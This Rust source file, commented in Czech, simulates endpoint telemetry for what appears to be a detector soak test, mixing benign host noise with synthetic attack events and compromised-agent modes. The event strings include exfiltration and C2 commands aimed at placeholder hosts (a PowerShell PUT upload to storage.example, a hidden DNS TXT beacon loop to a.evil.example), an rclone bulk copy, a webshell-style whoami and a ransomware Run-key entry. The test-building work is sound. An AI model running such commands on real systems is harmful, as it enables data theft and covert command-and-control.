//! Simulace koncové telemetrie pro soak (krok 8, D; impl-krok8.md A4).
//!
//! Události se odvozují z EXISTUJÍCÍCH rodin útoků a benigního provozu světa; žádná
//! nová útočná technika. Generátor píše autor (tvrdí „co by koncový nástroj
//! zaznamenal, kdyby techniku viděl“), takže měření ověřuje zapojení do jádra a
//! invarianty, ne zisk na reálném provozu (studie 08, bod 4).
//!
//! Nezávislost proudů: benigní události závisí jen na (zařízení, cyklus), útočné na
//! (id útoku, cyklus), takže kontrafaktuální svět bez útoků má benigní události beze
//! změny a atribuce nálezů útoku funguje stejně jako u síťových nálezů.
//!
//! Imperfekce: pokrytí hostů agentem, výpadky agenta, posun hodin, duplicity,
//! zašuměné benigní události, správcovské nástroje jako falešné podezření a
//! kompromitovaný agent (`silent`: nic neposílá; `ok`: místo útoku hlásí pravidelné
//! spojení podepsaného procesu na protistranu útoku od prvního cyklu).

use std::collections::{HashMap, HashSet};

use crate::{
    endpoint::model::{Conn, EndpointEvent, EndpointSource, EventKind, HostRef, Logon, Process},
    soak::{
        benign_regular::{Peer, RegularInstance},
        netmodel::NetworkModel,
        rng::{Rng, derive},
        traffic::{CYCLE_SECS, Family, Kind, Lookalike, Truth},
    },
};

/// Chování agentů na kompromitovaných hostech.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
pub enum AgentMode {
    #[default]
    Honest,
    /// Kompromitovaný agent nic neposílá.
    Silent,
    /// Kompromitovaný agent hlásí jen „vše v pořádku“ (podepsaný pravidelný vzor).
    Ok,
    /// Kompromitovaný agent hlásí nástroj ze seznamu povolených (jeho hash, podpis, výrobce):
    /// nejhorší případ pro pozitivní důkaz neškodnosti (krok 14).
    Mimic,
}

impl std::str::FromStr for AgentMode {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "honest" => Ok(AgentMode::Honest),
            "silent" => Ok(AgentMode::Silent),
            "ok" => Ok(AgentMode::Ok),
            "mimic" => Ok(AgentMode::Mimic),
            other => Err(format!(
                "neznamy rezim agenta {other} (honest | silent | ok)"
            )),
        }
    }
}

/// Volby světa koncové telemetrie (`--endpoint`, `--endpoint-coverage`, `--endpoint-agent`).
#[derive(Debug, Clone, Copy, PartialEq, serde::Serialize, serde::Deserialize)]
#[serde(default)]
pub struct EndpointWorld {
    pub on: bool,
    /// Podíl hostů s agentem v procentech.
    pub coverage_pct: u32,
    pub agent: AgentMode,
    /// Násobek šumu správcovských nástrojů (citlivostní osa; výchozí 1).
    pub noise: f64,
    /// Krok 14: podíl neškodných nástrojů, které správce zapsal do seznamu povolených (v %).
    pub allow_pct: u32,
}

impl Default for EndpointWorld {
    fn default() -> Self {
        Self {
            on: false,
            coverage_pct: 100,
            agent: AgentMode::Honest,
            noise: 1.0,
            allow_pct: 70,
        }
    }
}

/// Parametry šumu (volba autora; zapsané v impl-krok8.md).
const SPOOF_P: f64 = 0.01;
const DUP_P: f64 = 0.02;
const ADMIN_TOOL_P: f64 = 0.00005;
const ENC_SCRIPT_P: f64 = 0.00003;
const OUTAGE_HOST_P: f64 = 0.15;

fn visible_share(family: Family) -> f64 {
    match family {
        Family::Exploit | Family::WebExploit => 0.75,
        Family::Lateral => 0.7,
        Family::ApChain => 0.5,
        Family::C2Beacon | Family::DnsTunnel | Family::Cryptomining => 0.7,
        Family::FleetBeacon => 0.5,
        Family::SshBrute => 0.9,
        Family::CredentialStuffing => 0.6,
        Family::Ransomware => 0.8,
        Family::Exfil | Family::InsiderHoarding => 0.6,
        _ => 0.0,
    }
}

const WRITABLE: &str = "C:\\Users\\svc\\AppData\\Local\\Temp\\";

pub struct EndpointSim {
    pub world: EndpointWorld,
    seed: u64,
    covered: Vec<bool>,
    compromised: Vec<bool>,
    skew: Vec<i64>,
    outages: Vec<Vec<(u32, u32)>>,
    visible: HashMap<u32, bool>,
    /// Zařízení -> (protistrana, benigní vzor) pro celý běh (i pro pozadí).
    regular: Vec<(u32, String, bool, u16)>,
}

/// Krok 14 (A): podíl událostí, které koncový nástroj vidí, u variant, kde síť sama nestačí
/// (šifrované hromadné stažení a nahrání, DNS a cloudové API) a u neškodných nástrojů s podpisem.
/// Volba autora; měření ověřuje zapojení do jádra, ne zisk na reálném provozu.
fn var_visible_share(label: &str) -> f64 {
    match label {
        "bucket_mass_download"
        | "exfil_cloud_storage_upload"
        | "c2_cloud_storage_dead_drop"
        | "cloud_api_discovery_burst"
        | "drive_by_bulk_download"
        | "dns_zone_enum_burst"
        | "c2_dns_txt_beacon" => 0.75,
        // lidé klikají na odkazy v poště denně: koncový nástroj to od útoku neodliší
        "clicks_to_rare_destination" => 0.75,
        l if l.starts_with("hn_") => 0.8,
        _ => 0.0,
    }
}

/// Stabilní otisk podobný SHA-256 podle jména (simulace; reálný hash dodá agent).
pub fn sim_hash(name: &str) -> String {
    let mut out = String::with_capacity(64);
    for i in 0..4u64 {
        out.push_str(&format!("{:016x}", hash(&format!("{name}#{i}"))));
    }
    out
}

/// Neškodné nástroje s podpisem pro hn_* varianty: (obraz, výrobce).
fn hn_tool(label: &str) -> Option<(&'static str, &'static str)> {
    Some(match label {
        "hn_cdn_update_download" => (
            "C:\\Program Files\\Microsoft\\Update\\updater.exe",
            "Microsoft Corporation",
        ),
        "hn_nightly_cloud_backup_upload" => (
            "C:\\Program Files\\Veeam\\Agent\\veeamagent.exe",
            "Veeam Software",
        ),
        "hn_db_replication_bulk" => (
            "C:\\Program Files\\Microsoft SQL Server\\sqlservr.exe",
            "Microsoft Corporation",
        ),
        "hn_monitoring_snmp_sweep" => {
            ("C:\\Program Files\\Zabbix\\zabbix_server.exe", "Zabbix SIA")
        }
        "hn_password_sync_periodic" => (
            "C:\\Program Files\\Microsoft Azure AD Sync\\miiserver.exe",
            "Microsoft Corporation",
        ),
        "hn_admin_bulk_ssh" => (
            "C:\\Program Files\\OpenSSH\\ssh.exe",
            "Microsoft Corporation",
        ),
        "hn_mail_newsletter_burst" => (
            "C:\\Program Files\\Postfix\\smtp.exe",
            "The Postfix Project",
        ),
        "hn_authorized_internal_scan" => ("C:\\Program Files\\Tenable\\nessus.exe", "Tenable"),
        _ => return None,
    })
}

/// Seznam povolených, který správce nastavil (zbylé neškodné nástroje v něm nejsou).
pub fn sim_allowlist(now: i64, seed: u64, share_pct: u64) -> crate::endpoint::graph::Allowlist {
    let mut entries = Vec::new();
    for label in [
        "hn_cdn_update_download",
        "hn_nightly_cloud_backup_upload",
        "hn_db_replication_bulk",
        "hn_monitoring_snmp_sweep",
        "hn_password_sync_periodic",
        "hn_admin_bulk_ssh",
        "hn_mail_newsletter_burst",
        "hn_authorized_internal_scan",
    ] {
        if derive(seed, hash(label)) % 100 >= share_pct {
            continue;
        }
        if let Some((image, vendor)) = hn_tool(label) {
            entries.push(crate::endpoint::graph::AllowEntry {
                hash: sim_hash(image),
                vendor: Some(vendor.to_string()),
                peer: "0.0.0.0/0".into(),
                owner: "sprava-it".into(),
                expires_at: now + 90 * 86_400,
            });
        }
    }
    crate::endpoint::graph::Allowlist { entries }
}

fn name_of(device: u32) -> String {
    format!("host{device}")
}

impl EndpointSim {
    pub fn new(
        world: EndpointWorld,
        model: &NetworkModel,
        truths: &[Truth],
        regular: &[RegularInstance],
        ips: &[String],
    ) -> Self {
        let seed = derive(model.seed, 0xE9D0_1757);
        let n = model.devices.len();
        let mut rng = Rng::new(derive(seed, 1));
        let covered: Vec<bool> = (0..n)
            .map(|_| rng.range(0, 99) < world.coverage_pct as u64)
            .collect();
        let skew: Vec<i64> = (0..n)
            .map(|_| {
                if rng.chance(0.4) {
                    0
                } else {
                    rng.range(0, 300) as i64 * if rng.chance(0.5) { 1 } else { -1 }
                }
            })
            .collect();
        let outages: Vec<Vec<(u32, u32)>> = (0..n)
            .map(|_| {
                if rng.chance(OUTAGE_HOST_P) {
                    let start = rng.range(0, 400) as u32;
                    vec![(start, start + rng.range(4, 40) as u32)]
                } else {
                    Vec::new()
                }
            })
            .collect();
        // kompromitovany agent: hosty utoku (aktualni i maskovane utoky, stejne ve svetech)
        let mut compromised = vec![false; n];
        if world.agent != AgentMode::Honest {
            for t in truths.iter().filter(|t| matches!(t.kind, Kind::Attack(_))) {
                for d in t.victim_devices.iter().chain(t.attacker_device.iter()) {
                    compromised[*d as usize] = true;
                }
            }
        }
        let mut visible = HashMap::new();
        for t in truths {
            if let Kind::Attack(family) = t.kind {
                let mut r = Rng::new(derive(seed, 0x7157 + t.id as u64));
                let share = match family {
                    Family::Var(i) => var_visible_share(crate::soak::variants::spec(i).label),
                    other => visible_share(other),
                };
                visible.insert(t.id, r.chance(share));
            }
        }
        // benigni pravidelne vzory: pravidelne instance a lookalike (zdroj, protistrana)
        let mut pairs: Vec<(u32, String, bool, u16)> = Vec::new();
        // port vzoru: sluzba protistrany (zarizeni), jinak 443
        let port_of = |ip: &str| -> u16 {
            ips.iter()
                .position(|x| x == ip)
                .and_then(|d| model.devices[d].services.first())
                .map_or(443, |s| s.port)
        };
        for inst in regular {
            for peer in inst.peers.iter().take(3) {
                let ip = match peer {
                    Peer::Device(d) => ips[*d as usize].clone(),
                    Peer::External(ip) => ip.clone(),
                };
                let port = if inst.port != 0 {
                    inst.port
                } else {
                    port_of(&ip)
                };
                pairs.push((inst.src, ip, true, port));
            }
        }
        for t in truths {
            let Kind::Benign(look) = t.kind else { continue };
            if !matches!(
                look,
                Lookalike::Backup
                    | Lookalike::SoftwareUpdate
                    | Lookalike::NtpFanout
                    | Lookalike::BatchJob
                    | Lookalike::AuthorizedScanner
                    | Lookalike::FlashCrowd
            ) {
                continue;
            }
            let mut r = Rng::new(derive(seed, 0xBE15 + t.id as u64));
            let devices: Vec<u32> = t
                .victim_devices
                .iter()
                .copied()
                .chain(t.attacker_device)
                .collect();
            let mut peers: Vec<String> = devices.iter().map(|d| ips[*d as usize].clone()).collect();
            peers.extend(t.target_external.clone());
            peers.extend(t.attacker_external.clone());
            // 20 % lookalike nemá podepsaný proces (vlastní nástroj): zůstane NoSignal
            let signed = !r.chance(0.2);
            let mut count = 0;
            for d in &devices {
                for p in &peers {
                    if *p != ips[*d as usize] && count < 6 {
                        pairs.push((*d, p.clone(), signed, port_of(p)));
                        count += 1;
                    }
                }
            }
        }
        pairs.sort();
        pairs.dedup();
        Self {
            world,
            seed,
            covered,
            compromised,
            skew,
            outages,
            visible,
            regular: pairs,
        }
    }

    /// Host s agentem, kterého kompromitace ztišila (`silent`): kryje se jen v tom režimu.
    pub fn silenced(&self, device: u32) -> bool {
        self.world.agent == AgentMode::Silent
            && self.covered(device)
            && self.compromised.get(device as usize).copied().unwrap_or(false)
    }

    pub fn covered(&self, device: u32) -> bool {
        self.covered.get(device as usize).copied().unwrap_or(false)
    }

    fn host(&self, device: u32, ips: &[String], r: &mut Rng, model: &NetworkModel) -> HostRef {
        let ip = ips[device as usize].clone();
        let mut host = HostRef {
            hostname: Some(name_of(device)),
            ips: vec![ip],
            macs: vec![model.devices[device as usize].mac.clone()],
            agent: Some(format!("agent-{device}")),
        };
        // špatná identita agenta: jméno jednoho hosta a IP jiného (spor, nikdy sloučení)
        if r.chance(SPOOF_P) && ips.len() > 1 {
            let other = r.range(0, ips.len() as u64 - 1) as usize;
            if other != device as usize {
                host.ips = vec![ips[other].clone()];
                host.macs.clear();
            }
        }
        host
    }

    fn alive(&self, device: u32, cycle: u32) -> bool {
        self.covered(device)
            && !self.outages[device as usize]
                .iter()
                .any(|(a, b)| cycle >= *a && cycle <= *b)
    }

    /// Události cyklu (čas události podle hodin agenta, tedy s posunem). `masked` =
    /// utoky, které se v tomto světě neemitují.
    #[allow(clippy::too_many_arguments)]
    pub fn cycle(
        &self,
        cycle: u32,
        t0: i64,
        truths: &[Truth],
        masked: &HashSet<u32>,
        model: &NetworkModel,
        ips: &[String],
    ) -> Vec<EndpointEvent> {
        let mut out: Vec<EndpointEvent> = Vec::new();
        let at = |r: &mut Rng, device: u32| -> i64 {
            t0 + r.range(0, CYCLE_SECS as u64 - 1) as i64 + self.skew[device as usize]
        };
        let mk = |host: HostRef, ts: i64, kind: EventKind| EndpointEvent {
            source: EndpointSource::Sim,
            host,
            ts,
            kind,
        };
        // --- benigni pozadi: podepsane pravidelne vzory a sum ---
        for (device, peer, signed, port) in &self.regular {
            if !self.alive(*device, cycle)
                || self.compromised[*device as usize] && self.world.agent == AgentMode::Silent
            {
                continue;
            }
            let mut r = Rng::new(derive(
                self.seed ^ *device as u64,
                cycle as u64 * 7919 + hash(peer),
            ));
            let host = self.host(*device, ips, &mut r, model);
            // pravidelne: pevny odstup cyklu s malym jitterem (agent agreguje)
            let ts = t0 + 600 + r.range(0, 30) as i64 + self.skew[*device as usize];
            let (image, vendor, sig) = if *signed {
                (
                    "C:\\Program Files\\Veeam\\Agent\\veeamagent.exe",
                    Some("Veeam Software"),
                    Some(true),
                )
            } else {
                ("D:\\apps\\inhouse\\sync.exe", None, None)
            };
            out.push(mk(
                host,
                ts,
                EventKind::NetConnect(Conn {
                    image: Some(image.into()),
                    proto: "tcp".into(),
                    src_ip: Some(ips[*device as usize].clone()),
                    src_port: None,
                    dst_ip: peer.clone(),
                    dst_port: *port,
                    vendor: vendor.map(str::to_string),
                    signed: sig,
                }),
            ));
        }
        for device in 0..model.devices.len() as u32 {
            if !self.alive(device, cycle) || !model.devices[device as usize].up {
                continue;
            }
            if self.compromised[device as usize] && self.world.agent == AgentMode::Silent {
                continue;
            }
            let mut r = Rng::new(derive(self.seed ^ 0x5A5A ^ device as u64, cycle as u64));
            // beznyi sum: nekolik podepsanych procesu
            for _ in 0..r.range(1, 3) {
                let host = self.host(device, ips, &mut r, model);
                let ts = at(&mut r, device);
                out.push(mk(
                    host,
                    ts,
                    EventKind::ProcessCreate(Process {
                        image: format!("C:\\Windows\\System32\\svc{}.exe", r.range(0, 9)),
                        parent_image: Some("C:\\Windows\\System32\\services.exe".into()),
                        cmdline: String::new(),
                        user: Some("SYSTEM".into()),
                        signed: None,
                        vendor: Some("Microsoft Corporation".into()),
                        hash: None,
                    }),
                ));
            }
            // spravcovsky nastroj (falesne podezreni): PsExec po vzdalenem prihlaseni
            if r.chance(ADMIN_TOOL_P * self.world.noise) {
                let host = self.host(device, ips, &mut r, model);
                let ts = at(&mut r, device);
                out.push(mk(
                    host.clone(),
                    ts,
                    EventKind::Logon(Logon {
                        user: "admin".into(),
                        logon_type: 3,
                        src_ip: Some(ips[model.gateway as usize].clone()),
                        success: true,
                    }),
                ));
                out.push(mk(
                    host,
                    ts + 20,
                    EventKind::ProcessCreate(Process {
                        image: "C:\\Windows\\PSEXESVC.exe".into(),
                        parent_image: Some("C:\\Windows\\System32\\services.exe".into()),
                        cmdline: "PSEXESVC.exe".into(),
                        user: Some("admin".into()),
                        signed: None,
                        vendor: None,
                        hash: None,
                    }),
                ));
            }
            // spravcovsky skript s kodovanym prikazem
            if r.chance(ENC_SCRIPT_P * self.world.noise) {
                let host = self.host(device, ips, &mut r, model);
                let ts = at(&mut r, device);
                out.push(mk(
                    host,
                    ts,
                    EventKind::ProcessCreate(Process {
                        image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                            .into(),
                        parent_image: Some("C:\\Windows\\System32\\svchost.exe".into()),
                        cmdline: "powershell.exe -NoProfile -enc SQBFAFgA".into(),
                        user: Some("admin".into()),
                        signed: None,
                        vendor: Some("Microsoft Corporation".into()),
                        hash: None,
                    }),
                ));
            }
        }
        // --- utoky (jen aktivni cyklus a nemaskovane) ---
        for t in truths {
            let Kind::Attack(family) = t.kind else {
                continue;
            };
            if masked.contains(&t.id) || cycle < t.start_cycle || cycle > t.end_cycle {
                continue;
            }
            if !self.visible.get(&t.id).copied().unwrap_or(false) {
                continue;
            }
            let mut r = Rng::new(derive(self.seed ^ 0xA77A ^ t.id as u64, cycle as u64));
            let first = cycle == t.start_cycle;
            let victims: Vec<u32> = t.victim_devices.clone();
            let ext_peer = t
                .target_external
                .clone()
                .or_else(|| t.attacker_external.clone());
            let attacker_ip = t
                .attacker_device
                .map(|d| ips[d as usize].clone())
                .or_else(|| t.attacker_external.clone());
            let emit = |device: u32,
                        kind: EventKind,
                        delay: i64,
                        r: &mut Rng,
                        out: &mut Vec<EndpointEvent>| {
                if !self.alive(device, cycle) {
                    return;
                }
                let comp = self.compromised[device as usize];
                if comp {
                    // silent: nic; ok: utocne udalosti se neposilaji (kryci vzor nize)
                    return;
                }
                let host = self.host(device, ips, r, model);
                let ts = at(r, device) + delay;
                out.push(mk(host, ts, kind));
            };
            match family {
                Family::Exploit | Family::WebExploit if first => {
                    for v in victims.iter().take(2) {
                        emit(
                            *v,
                            EventKind::ProcessCreate(Process {
                                image: "C:\\Windows\\System32\\cmd.exe".into(),
                                parent_image: Some("C:\\inetpub\\w3wp.exe".into()),
                                cmdline: "cmd.exe /c whoami".into(),
                                user: Some("iis".into()),
                                signed: None,
                                vendor: Some("Microsoft Corporation".into()),
                                hash: None,
                            }),
                            0,
                            &mut r,
                            &mut out,
                        );
                    }
                }
                Family::Lateral | Family::ApChain if first || r.chance(0.3) => {
                    for v in victims.iter().take(3) {
                        emit(
                            *v,
                            EventKind::Logon(Logon {
                                user: "svc_backup".into(),
                                logon_type: 3,
                                src_ip: attacker_ip.clone(),
                                success: true,
                            }),
                            0,
                            &mut r,
                            &mut out,
                        );
                        emit(
                            *v,
                            EventKind::ServiceInstall {
                                name: "updsvc".into(),
                                image: format!("{WRITABLE}u.exe"),
                                signed: None,
                            },
                            30,
                            &mut r,
                            &mut out,
                        );
                    }
                }
                Family::C2Beacon
                | Family::DnsTunnel
                | Family::Cryptomining
                | Family::FleetBeacon => {
                    if let Some(peer) = &ext_peer {
                        let sources: Vec<u32> = t
                            .attacker_device
                            .into_iter()
                            .chain(victims.iter().copied())
                            .take(if family == Family::FleetBeacon { 6 } else { 1 })
                            .collect();
                        for s in sources {
                            // jeden vzorek za cyklus (pravidelny odstup, agent agreguje)
                            let mut r2 = Rng::new(derive(
                                self.seed ^ 0xC2C2 ^ t.id as u64 ^ s as u64,
                                cycle as u64,
                            ));
                            if !self.alive(s, cycle) || self.compromised[s as usize] {
                                continue;
                            }
                            let host = self.host(s, ips, &mut r2, model);
                            let ts = t0 + 900 + r2.range(0, 20) as i64 + self.skew[s as usize];
                            out.push(mk(
                                host,
                                ts,
                                EventKind::NetConnect(Conn {
                                    image: Some(format!("{WRITABLE}svchosts.exe")),
                                    proto: "tcp".into(),
                                    src_ip: Some(ips[s as usize].clone()),
                                    src_port: None,
                                    dst_ip: peer.clone(),
                                    dst_port: 443,
                                    vendor: None,
                                    signed: None,
                                }),
                            ));
                        }
                    }
                }
                Family::SshBrute | Family::CredentialStuffing => {
                    for v in victims.iter().take(2) {
                        for k in 0..12 {
                            emit(
                                *v,
                                EventKind::Logon(Logon {
                                    user: format!("user{}", k % 4),
                                    logon_type: 0,
                                    src_ip: attacker_ip.clone(),
                                    success: false,
                                }),
                                k,
                                &mut r,
                                &mut out,
                            );
                        }
                    }
                }
                Family::Ransomware if first => {
                    for v in victims.iter().take(1) {
                        emit(
                            *v,
                            EventKind::ProcessCreate(Process {
                                image: format!("{WRITABLE}locker.exe"),
                                parent_image: Some("C:\\Windows\\explorer.exe".into()),
                                cmdline: "locker.exe".into(),
                                user: None,
                                signed: None,
                                vendor: None,
                                hash: None,
                            }),
                            0,
                            &mut r,
                            &mut out,
                        );
                        emit(
                            *v,
                            EventKind::Persistence {
                                mechanism: "registry_run".into(),
                                target: format!("HKCU\\Run\\x = {WRITABLE}locker.exe"),
                                image: Some(format!("{WRITABLE}locker.exe")),
                                signed: None,
                            },
                            5,
                            &mut r,
                            &mut out,
                        );
                    }
                }
                Family::Exfil | Family::InsiderHoarding if first => {
                    for v in victims.iter().take(1) {
                        emit(
                            *v,
                            EventKind::ProcessCreate(Process {
                                image: format!("{WRITABLE}7z.exe"),
                                parent_image: None,
                                cmdline: "7z.exe a data.7z".into(),
                                user: None,
                                signed: None,
                                vendor: None,
                                hash: None,
                            }),
                            0,
                            &mut r,
                            &mut out,
                        );
                    }
                }
                Family::Var(i) => {
                    let label = crate::soak::variants::spec(i).label;
                    let peer = ext_peer.clone().unwrap_or_default();
                    let user = Some("jnovak".to_string());
                    let proc_ev = |image: &str,
                                   parent: &str,
                                   cmd: &str,
                                   signed: Option<bool>,
                                   vendor: Option<&str>| {
                        EventKind::ProcessCreate(Process {
                            hash: Some(sim_hash(image)),
                            image: image.to_string(),
                            parent_image: Some(parent.to_string()),
                            cmdline: cmd.to_string(),
                            user: user.clone(),
                            signed,
                            vendor: vendor.map(str::to_string),
                        })
                    };
                    let conn_to = |image: &str,
                                   signed: Option<bool>,
                                   vendor: Option<&str>,
                                   dst: &str| {
                        EventKind::NetConnect(Conn {
                            image: Some(image.to_string()),
                            proto: "tcp".into(),
                            src_ip: None,
                            src_port: None,
                            dst_ip: dst.to_string(),
                            dst_port: 443,
                            vendor: vendor.map(str::to_string),
                            signed,
                        })
                    };
                    const PS: &str =
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                    const MS: &str = "Microsoft Corporation";
                    // aktivní stroj: oběť, nebo interní klient (u IntToExt je to `attacker_device`)
                    if let Some(v) = victims.first().copied().or(t.attacker_device) {
                        match label {
                            "bucket_mass_download" | "exfil_cloud_storage_upload" if first => {
                                let img = format!("{WRITABLE}rclone.exe");
                                emit(
                                    v,
                                    proc_ev(
                                        &img,
                                        PS,
                                        "rclone.exe copy D:\\share remote:bucket --transfers 16 --password=xx",
                                        None,
                                        None,
                                    ),
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                                emit(v, conn_to(&img, None, None, &peer), 5, &mut r, &mut out);
                            }
                            "c2_cloud_storage_dead_drop" if first || r.chance(0.3) => {
                                emit(
                                    v,
                                    proc_ev(
                                        PS,
                                        "C:\\Windows\\explorer.exe",
                                        "powershell.exe -nop Invoke-RestMethod -Uri https://storage.example/d -Method Put -InFile x.bin",
                                        Some(true),
                                        Some(MS),
                                    ),
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                            }
                            "drive_by_bulk_download" if first => {
                                emit(
                                    v,
                                    EventKind::FileCreate {
                                        image: Some(
                                            "C:\\Program Files\\Microsoft\\Edge\\msedge.exe".into(),
                                        ),
                                        path: "C:\\Users\\jnovak\\Downloads\\update_setup.exe"
                                            .into(),
                                    },
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                                emit(
                                    v,
                                    proc_ev(
                                        "C:\\Users\\jnovak\\Downloads\\update_setup.exe",
                                        "C:\\Windows\\explorer.exe",
                                        "update_setup.exe",
                                        None,
                                        None,
                                    ),
                                    6,
                                    &mut r,
                                    &mut out,
                                );
                            }
                            "dns_zone_enum_burst" if first => {
                                emit(
                                    v,
                                    proc_ev(
                                        "C:\\Windows\\System32\\nslookup.exe",
                                        "C:\\Windows\\System32\\cmd.exe",
                                        "nslookup -type=axfr corp.local",
                                        Some(true),
                                        Some(MS),
                                    ),
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                            }
                            "c2_dns_txt_beacon" if first => {
                                emit(
                                    v,
                                    proc_ev(
                                        PS,
                                        "C:\\Windows\\explorer.exe",
                                        "powershell.exe -w hidden while($true){Resolve-DnsName -Type TXT a.evil.example;Start-Sleep 60}",
                                        Some(true),
                                        Some(MS),
                                    ),
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                            }
                            "cloud_api_discovery_burst" if first => {
                                for (n, sub) in [
                                    "iam list-users",
                                    "s3 ls",
                                    "ec2 describe-instances",
                                    "sts get-caller-identity",
                                ]
                                .iter()
                                .enumerate()
                                {
                                    emit(
                                        v,
                                        proc_ev(
                                            "C:\\Program Files\\Amazon\\AWSCLIV2\\aws.exe",
                                            PS,
                                            &format!("aws {sub}"),
                                            Some(true),
                                            Some("Amazon Web Services"),
                                        ),
                                        n as i64,
                                        &mut r,
                                        &mut out,
                                    );
                                }
                            }
                            "clicks_to_rare_destination" if first => {
                                // od běžného kliknutí na odkaz v poště se neliší
                                emit(
                                    v,
                                    proc_ev(
                                        "C:\\Program Files\\Microsoft\\Edge\\msedge.exe",
                                        "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                                        "msedge.exe https://rare.example/offer",
                                        Some(true),
                                        Some(MS),
                                    ),
                                    0,
                                    &mut r,
                                    &mut out,
                                );
                            }
                            l if l.starts_with("hn_") => {
                                if let Some((image, vendor)) = hn_tool(l) {
                                    // 20 % instancí používá vlastní nepodepsaný nástroj (v seznamu není)
                                    let own = derive(self.seed, 0x0A17 + t.id as u64) % 100 < 20;
                                    let (img, signed, ven) = if own {
                                        ("D:\\apps\\inhouse\\transfer.exe", None, None)
                                    } else {
                                        (image, Some(true), Some(vendor))
                                    };
                                    if first || r.chance(0.2) {
                                        // všichni zúčastnění hosté nálezu hlásí nástroj (jinak by
                                        // zdroj nálezu zůstal bez vysvětlení)
                                        let involved: Vec<u32> = victims
                                            .iter()
                                            .copied()
                                            .chain(t.attacker_device)
                                            .take(12)
                                            .collect();
                                        for (k, h) in involved.iter().enumerate() {
                                            let dst = if peer.is_empty() {
                                                involved
                                                    .iter()
                                                    .find(|o| **o != *h)
                                                    .map(|o| ips[*o as usize].clone())
                                                    .unwrap_or_default()
                                            } else {
                                                peer.clone()
                                            };
                                            if dst.is_empty() {
                                                continue;
                                            }
                                            let _ = k;
                                            emit(
                                                *h,
                                                proc_ev(
                                                    img,
                                                    "C:\\Windows\\System32\\services.exe",
                                                    "",
                                                    signed,
                                                    ven,
                                                ),
                                                0,
                                                &mut r,
                                                &mut out,
                                            );
                                            emit(
                                                *h,
                                                conn_to(img, signed, ven, &dst),
                                                3,
                                                &mut r,
                                                &mut out,
                                            );
                                        }
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }
        // `ok`: kryci vzor ve VSECH cyklech (i pred utokem a bez ohledu na masku sveta)
        if matches!(self.world.agent, AgentMode::Ok | AgentMode::Mimic) {
            let mimic = self.world.agent == AgentMode::Mimic;
            let (m_image, m_vendor) = hn_tool("hn_nightly_cloud_backup_upload").unwrap_or(("", ""));
            for t in truths.iter().filter(|t| matches!(t.kind, Kind::Attack(_))) {
                let ext = t
                    .target_external
                    .clone()
                    .or_else(|| t.attacker_external.clone());
                let attacker_ip = t.attacker_device.map(|d| ips[d as usize].clone());
                let peers: Vec<String> = ext.into_iter().chain(attacker_ip).collect();
                for d in t.victim_devices.iter().copied().chain(t.attacker_device) {
                    if !self.compromised[d as usize] || !self.alive(d, cycle) {
                        continue;
                    }
                    for p in &peers {
                        let mut r3 = Rng::new(derive(
                            self.seed ^ 0xC0DE ^ d as u64,
                            cycle as u64 + hash(p),
                        ));
                        let host = self.host(d, ips, &mut r3, model);
                        let ts = t0 + 700 + r3.range(0, 20) as i64 + self.skew[d as usize];
                        if mimic {
                            out.push(mk(
                                host.clone(),
                                ts - 5,
                                EventKind::ProcessCreate(Process {
                                    image: m_image.to_string(),
                                    parent_image: Some(
                                        "C:\\Windows\\System32\\services.exe".into(),
                                    ),
                                    cmdline: String::new(),
                                    user: Some("SYSTEM".into()),
                                    signed: Some(true),
                                    vendor: Some(m_vendor.to_string()),
                                    hash: Some(sim_hash(m_image)),
                                }),
                            ));
                        }
                        out.push(mk(
                            host,
                            ts,
                            EventKind::NetConnect(Conn {
                                image: Some(if mimic {
                                    m_image.to_string()
                                } else {
                                    "C:\\Program Files\\Microsoft\\Edge\\msedge.exe".into()
                                }),
                                proto: "tcp".into(),
                                src_ip: Some(ips[d as usize].clone()),
                                src_port: None,
                                dst_ip: p.clone(),
                                dst_port: 443,
                                vendor: Some("Microsoft Corporation".into()),
                                signed: Some(true),
                            }),
                        ));
                    }
                }
            }
        }
        // duplicity (at-least-once) a promichani poradi prijmu
        let mut dups = Vec::new();
        let mut r = Rng::new(derive(self.seed ^ 0xD0D0, cycle as u64));
        for e in &out {
            if r.chance(DUP_P) {
                dups.push(e.clone());
            }
        }
        out.extend(dups);
        let n = out.len();
        for i in (1..n).rev() {
            let j = r.range(0, i as u64) as usize;
            out.swap(i, j);
        }
        out
    }
}

fn hash(text: &str) -> u64 {
    text.bytes().fold(0xcbf2_9ce4_8422_2325u64, |a, b| {
        (a ^ u64::from(b)).wrapping_mul(0x100_0000_01b3)
    })
}
